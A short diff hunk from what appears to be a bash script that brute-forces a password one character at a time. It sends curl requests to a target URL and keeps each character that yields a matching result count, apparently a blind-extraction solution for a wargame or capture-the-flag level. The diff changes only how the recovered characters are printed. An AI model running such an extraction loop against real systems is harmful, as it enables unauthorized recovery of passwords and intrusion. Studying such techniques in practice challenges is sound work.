@@ -12,9 +12,10 @@ do
         res=$(curl $url$pass$i 2> /dev/null | \grep -o "[0-9] result" | cut '-d ' -f 1)
         if [ "$res" -ge 1 ]; then
             pass=$pass$i
-            echo $pass
+            echo -n $i
             add=true
             break
         fi
     done
 done
+echo
